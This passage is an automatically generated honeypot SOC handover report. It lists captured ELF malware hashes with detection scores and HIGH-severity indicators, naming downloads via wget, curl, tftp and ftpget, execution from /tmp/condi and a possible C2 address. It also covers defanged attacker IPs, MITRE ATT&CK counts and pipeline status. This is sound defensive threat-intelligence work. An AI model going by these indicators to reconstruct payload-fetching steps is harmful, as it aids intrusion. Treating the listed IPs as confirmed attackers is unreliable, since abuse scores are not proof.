| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `220.180.166[.]214` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `114.98.63[.]18` | CN | CHINANET Anhui PROVINCE NETWORK | **100** ⚠️ | 50 |
| `111.70.32[.]46` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 7 |
| `78.66.44[.]246` | SE | Telia Network Services | **100** ⚠️ | 50 |
| `49.124.153[.]30` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 38 |
| `67.85.146[.]216` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 50 |
| `113.140.95[.]2` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `121.159.71[.]249` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `65.20.163[.]103` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 85 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 11 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 10 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 149 cases |
| Tool 34  | Credential Extractor        | ✅ 84 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 79 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (14.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 47 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 20 recon entry/entries in table (12 group(s) consolidating 56 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-19T19:12:35Z_
